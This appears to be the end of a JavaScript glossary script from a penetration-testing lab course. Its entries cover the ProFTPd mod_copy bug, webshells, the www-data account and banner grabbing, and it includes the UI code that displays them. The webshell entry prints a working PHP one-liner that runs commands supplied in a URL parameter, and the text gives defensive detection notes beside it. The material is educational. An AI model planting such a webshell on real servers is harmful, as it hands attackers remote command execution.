          '<p>The bug in ProFTPd 1.3.5 was that the <code>mod_copy</code> handlers ran <em>before</em> the daemon checked whether the client had authenticated. The fix in 1.3.6 was a single added guard at the top of each handler: <code>if (session.auth_required) return PR_DENIED;</code>. The lab walks the cost of that missing line.</p>',
      },
      'webshell': {
        title: 'webshell',
        body:
          '<p>A <strong>webshell</strong> is a small script — usually one to ten lines — that lives in a web server\'s document root and, when fetched by HTTP, executes shell commands supplied through a URL parameter or POST body. The canonical PHP one-liner is <code>&lt;?php system($_GET["c"]); ?&gt;</code>: a single function call that runs whatever string is in the <code>c</code> query parameter and prints the output.</p>' +
          '<p>Webshells are the standard "initial-access ↦ persistent foothold" bridge in real intrusions. Once an attacker has any kind of file-write primitive on a web server, dropping a webshell is usually step one — it converts the bug into a stable HTTP-driven command channel that survives across reboots, evades most IDSs (HTTP traffic is unremarkable), and can be invoked from any browser. Defenders look for webshells with file-integrity monitoring (a new <code>.php</code> file in a directory that doesn\'t normally change) and with HTTP-log analysis (suspicious query-string patterns to .php files that don\'t belong to the site\'s real codebase).</p>',
      },
      'www-data': {
        title: 'www-data',
        body:
          '<p><strong><code>www-data</code></strong> is the unprivileged user account that Apache (and most other web servers) runs as on Debian/Ubuntu systems. It exists specifically so the web server doesn\'t need <code>root</code> for its day-to-day work: serving static files, reading PHP scripts, talking to upstream databases. UID 33 by convention. The <code>www-data</code> account typically has no login shell, no home directory worth visiting, and read-only access to the web root.</p>' +
          '<p>When a webshell exploit lands, the resulting shell runs as <code>www-data</code> — not as <code>root</code>. <code>www-data</code> can run any command on the box, but it cannot read <code>/etc/shadow</code>, bind privileged ports, or modify system configuration. Getting from <code>www-data</code> to <code>root</code> is a separate phase called <strong>privilege escalation</strong>, covered in detail in <a href="../lab-10/pentest.html">Lab 10</a>.</p>',
      },
      'banner': {
        title: 'banner',
        body:
          '<p>A <strong>banner</strong> is the short text string a service prints to a freshly-opened connection, before any login or command exchange happens. Its original purpose is human-readable identification — when you <code>telnet</code> into an FTP server you expect to see <code>220 (vsFTPd 2.3.4)</code> at the top of the session so you know what you reached. By long-standing convention the banner includes the service name and, very often, its version.</p>' +
          '<p>That convention is gold for an attacker. <code>nmap -sV</code> opens a TCP connection to each port, reads whatever banner the service sends, and matches the string against a fingerprint database to identify the service and version. Once Nmap reports <code>vsftpd 2.3.4</code>, you have everything you need to look up <a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">CVE-2011-2523</a> and pick the matching exploit module. <strong>Banner grabbing</strong> is the term for this whole technique, and it is the first step of essentially every enumeration script ever written.</p>',
      },
    };

    function clearActive() {
      document.querySelectorAll('.gloss.active').forEach(t => t.classList.remove('active'));
    }

    // Find the nearest block-level container we can insert the panel AFTER.
    // For terms inside an <li>, promote to the enclosing <ol>/<ul> (can't make
    // a non-<li> sibling inside a list). For <td>/<th>, promote to the <table>.
    function findInsertTarget(termEl) {
      if (!termEl || !termEl.parentElement) return null;
      let node = termEl.parentElement;
      while (node) {
        const tag = (node.tagName || '').toLowerCase();
        if (['p','h1','h2','h3','h4','h5','blockquote','pre','figure','div'].includes(tag)) {
          // Don't bubble into <main>/<body> by treating them as block targets.
          if (node.id === 'glossary-panel' || node === panel) {
            node = node.parentElement;
            continue;
          }
          return node;
        }
        if (tag === 'li') {
          const list = node.parentElement;
          if (list && (list.tagName === 'OL' || list.tagName === 'UL')) return list;
          return node;
        }
        if (tag === 'td' || tag === 'th') {
          let t = node;
          while (t && t.tagName !== 'TABLE') t = t.parentElement;
          return t || node;
        }
        if (tag === 'main' || tag === 'body') return null;
        node = node.parentElement;
      }
      return null;
    }

    function show(termId, el) {
      const entry = GLOSSARY[termId];
      if (!entry) return;
      clearActive();
      if (el) el.classList.add('active');
      content.innerHTML =
        '<div class="glossary-panel-title">' + entry.title + '</div>' + entry.body;
      // Move the panel to sit immediately after the term's nearest block.
      const target = el ? findInsertTarget(el) : null;
      if (target && target.parentNode && target.nextSibling !== panel) {
        target.parentNode.insertBefore(panel, target.nextSibling);
      }
      // Restart the fade-in animation each time so swapping terms feels live.
      panel.hidden = false;
      panel.style.animation = 'none';
      // Force reflow so the animation restart actually triggers.
      void panel.offsetWidth;
      panel.style.animation = '';
    }

    function hide() {
      clearActive();
      panel.hidden = true;
    }

    terms.forEach(t => {
      t.setAttribute('tabindex', '0');
      t.setAttribute('role', 'button');
      const id = t.getAttribute('data-gloss');
      t.addEventListener('mouseenter', () => show(id, t));
      t.addEventListener('focus',      () => show(id, t));
      t.addEventListener('click',      (e) => { e.preventDefault(); show(id, t); });
      t.addEventListener('keydown',    (e) => {
        if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); show(id, t); }
      });
    });

    closeBtn.addEventListener('click', hide);
    // Esc closes too (but only if the panel is the most "in-focus" thing —
    // skip when an input/textarea is focused so terminal typing isn't disrupted).
    document.addEventListener('keydown', (e) => {
      if (e.key !== 'Escape') return;
      if (panel.hidden) return;
      if (e.target && e.target.matches && e.target.matches('input, textarea, [contenteditable]')) return;
      hide();
    });
  })();

})();
